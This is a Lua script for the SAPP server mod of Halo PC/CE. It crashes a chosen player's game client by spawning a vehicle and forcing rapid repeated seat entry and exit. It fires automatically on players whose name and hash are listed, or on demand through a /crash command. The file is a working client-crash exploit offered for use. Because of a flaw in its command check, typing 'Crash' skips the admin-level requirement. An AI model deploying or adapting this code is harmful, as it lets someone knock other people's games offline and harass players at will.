--[[
--=====================================================================================================--
Script Name: Crash Player (utility), for SAPP (PC & CE)
Implementing API version: 1.11.0.0
Description:    Crash someone automatically when they join the server (based on Name/Hash comparisons)
                - or Crash someone (anyone) on demand!

                Command Syntax: /crash <player id>

Copyright (c) 2016-2018, Jericho Crosby <jericho.crosby227@gmail.com>
* Notice: You can use this document subject to the following conditions:
https://github.com/Chalwk77/Halo-Scripts-Phasor-V2-/blob/master/LICENSE

* Written by Jericho Crosby (Chalwk)
--=====================================================================================================--
]]--

CRASH_COMMAND = "crash"
LEVEL = 1 -- Min admin level required to use /crash command
api_version = "1.12.0.0"
rocket_hog = "vehicles\\rwarthog\\rwarthog"
function OnScriptLoad()
    register_callback(cb['EVENT_GAME_START'], "OnGameStart")
    safe_read(true)
    if CheckMap() then
        register_callback(cb['EVENT_PREJOIN'], "OnPlayerPrejoin")
        register_callback(cb['EVENT_COMMAND'], "OnServerCommand")
        if halo_type == "PC" then ce = 0x0 else ce = 0x40 end
        network_struct = read_dword(sig_scan("F3ABA1????????BA????????C740??????????E8????????668B0D") + 3)
        LoadTables()
    end
    safe_read(false)
end

function OnGameStart()
    if CheckMap() then
        register_callback(cb['EVENT_PREJOIN'], "OnPlayerPrejoin")
        register_callback(cb['EVENT_COMMAND'], "OnServerCommand")
    else
        unregister_callback(cb['EVENT_PREJOIN'])
        unregister_callback(cb['EVENT_COMMAND'])
    end
end

function OnScriptUnload()
    NameList = { }
    HashList = { }
end

function OnServerCommand(PlayerIndex, Command)
    local response = nil
    local t = tokenizestring(Command)
    count = #t
    if t[1] ~= nil then
        if tonumber(get_var(PlayerIndex, "$lvl")) >= LEVEL and t[1] == CRASH_COMMAND or t[1] == "Crash" then
            response = false
            if t[2] ~= nil then
                sufferer = tonumber(t[2])
                if sufferer ~= nil and sufferer > 0 and sufferer < 17 then
                    sufferers_name = get_var(sufferer, "$name")
                    if player_present(sufferer) then
                        timer(0, "CrashPlayer", sufferer)
                        say(PlayerIndex, "You crashed " .. sufferers_name .. "'s game!")
                    else
                        say(PlayerIndex, "Invalid player!")
                    end
                end
            else
                say(PlayerIndex, "Invalid Syntax! Syntax: " .. t[1] .. " [number 1-16]")
            end
        end
    end
    return response
end

function tokenizestring(inputstr, sep)
    if sep == nil then
        sep = "%s"
    end
    local t = { }; i = 1
    for str in string.gmatch(inputstr, "([^" .. sep .. "]+)") do
        t[i] = str
        i = i + 1
    end
    return t
end

function LoadTables()
    NameList = {
        -- Make sure these names match exactly as they do ingame.
        "Example",
        "Example",
        "Example",
        "Example",
        "Example",
        "Example"
    }
    HashList = {
        -- You can retrieve the players hash by looking it up in the sapp.log file.
        "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
        "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
        "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
        "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
        "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
        "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
        "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
        "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
        "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
        "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
    }
end

function OnPlayerPrejoin(PlayerIndex)
    local network_struct = read_dword(sig_scan("F3ABA1????????BA????????C740??????????E8????????668B0D") + 3)
    local client_network_struct = network_struct + 0x1AA + ce + to_real_index(PlayerIndex) * 0x20
    local Name = read_widestring(client_network_struct, 12)
    local Hash = get_var(PlayerIndex, "$hash")
    local PlayerIP = get_var(PlayerIndex, "$ip")
    if table.match(NameList, Name) and table.match(HashList, Hash) then
        timer(3000, "CrashPlayer", PlayerIndex)
    end
end

function table.match(table, value)
    for k, v in pairs(table) do
        if v == value then
            return k
        end
    end
end

function read_widestring(address, length)
    local count = 0
    local byte_table = { }
    for i = 1, length do
        if read_byte(address + count) ~= 0 then
            byte_table[i] = string.char(read_byte(address + count))
        end
        count = count + 2
    end
    return table.concat(byte_table)
end

-- Thanks to aLTis for this function!
function CheckMap()
    if (lookup_tag("vehi", rocket_hog) ~= 0) then
        return true
    else
        return false
    end
end

-- Thanks to H® Shaft for this neat little function!
function CrashPlayer(sufferer)
    if player_present(sufferer) then
        local player_object = get_dynamic_player(sufferer)
        if (player_object ~= 0) then
            local x, y, z = read_vector3d(player_object + 0x5C)
            local vehicleId = spawn_object("vehi", "vehicles\\rwarthog\\rwarthog", x, y, z)
            local veh_obj = get_object_memory(vehicleId)
            if (veh_obj ~= 0) then
                for j = 0, 20 do
                    enter_vehicle(vehicleId, sufferer, j)
                    exit_vehicle(sufferer)
                end
                destroy_object(vehicleId)
            end
        end
    end
    return false
end
